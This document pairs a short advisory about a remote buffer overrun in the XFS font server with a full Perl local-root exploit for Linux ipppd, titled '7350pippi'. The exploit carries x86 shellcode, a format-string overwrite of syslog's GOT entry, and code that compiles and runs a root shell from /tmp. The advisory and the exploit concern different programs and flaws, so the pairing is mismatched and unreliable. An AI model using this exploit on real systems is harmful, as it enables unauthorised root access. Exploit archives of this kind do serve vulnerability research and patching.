source: http://www.securityfocus.com/bid/6241/info

A remotely exploitable buffer overrun condition has been reported in the XFS font server, fs.auto used by multiple vendors. This vulnerability may be exploited by remote attackers to execute commands on the target host with privileges of user nobody. 

This vulnerability has been reported fixed in XFree86 3.3.6 and later.

#!/usr/bin/perl

# 7350pippi - x86/Linux ipppd local root
#
# (C) COPYRIGHT TESO Security, 2002
# All Rights Reserved
#
# May be used under the terms of the GPL.

# ipppd local root exploit:
# ... 
#    /*
#     * Check if there is a device by this name.
#     */
#    if (stat(cp, &statbuf) < 0) {
#        if (errno == ENOENT)
#            return 0;
#        syslog(LOG_ERR, cp);
#        return -1;
#    }
# ...
# 
# This exploit changes the address of syslog in ipppd's
# GOT. Since it returns -1 as seen above, ipppd will invoke
# syslog() a second time soon this time using the address
# given by us. We redirect the GOT entry to a stacklocation
# where the filename of the executed program is normally
# located. Since we symlink() the shellcode to /usr/sbin/ipppd
# the shellcode goes on the stack AT A FIXED ADDRESS! Thus
# we avoid ugly offsets and guessing/bruteforce.
# If porting this exploits to other systems, you
# need to find syslogs() GOT entry yourself.
#

use Fcntl;

# chown()+chmod() /tmp/boomsh
$shellcode = "\x90"x100 .
"\x31\xc0\xb0\x46\xbb\xff\xff\xff\xff\x31\xc9\xcd\x80\xeb".
"\x2a\x90\x90\x90\x90\x5e\x89\xf3\xff\x03\xff\x43\x04\x31".
"\xc0\x88\x43\x0b\x31\xc0\xb0\xb6\x31\xc9\x31\xd2\xcd\x80".
"\x31\xc0\xb0\x0f\x66\xb9\xed\x0d\xcd\x80\x31\xc0\x40\xcd".
"\x80\xe8\xd5\xff\xff\xff\x2e\x74\x6d\x70\x2e\x62\x6f\x6f".
"\x6d\x73\x68\x2e";

unlink("/tmp/$shellcode");
symlink("/usr/sbin/ipppd", "/tmp/$shellcode") or die "$!";

# my syslog GOT entry @ 0x806c90c

sysopen(O, "/tmp/boomsh.c", O_RDWR|O_CREAT, 0600) or die "$!";
print O<<_EOF_;
#include <stdio.h>
int main()
{
        char *a[] = {"/bin/bash", "--norc", "--noprofile", NULL};

        setuid(0);
        execve(*a, a, NULL);
        return -1;
}
_EOF_
close O;

print "Compiling boomshell ...\n";
system("cc /tmp/boomsh.c -o /tmp/boomsh");

$dir = "/tmp/L";
mkdir($dir);

$ret = 0xbffffffb - length($shellcode)+20;
printf("Filename is located @ %x\n", $ret);


# maybe need to change to your GOT entry
# of syslog(); see above
$file = "XX" . 	pack(c4, 0x0c, 0xc9, 0x06, 0x08) . "1234" . # GOT
		pack(c4, 0x0d, 0xc9, 0x06, 0x08) . "1234" . # GOT+1
		pack(c4, 0x0e, 0xc9, 0x06, 0x08) . "1234" . # GOT+2
		pack(c4, 0x0f, 0xc9, 0x06, 0x08); 	    # GOT+3
		
$stackpop = "%p"x11;
$file .= $stackpop;

#$file .= "%14d%n%69d%n%40d%n%192d%n";

# Should be fixed. If not, find the 4 values for
# %d yourself using gdb. This worked for me.
$file .= "%221d%n%158d%n%256d%n%192d%n";

open(O, ">$dir/$file") or die "$!";
close O;

system("/tmp/$shellcode", "..$dir/$file/");

exec("/tmp/boomsh");

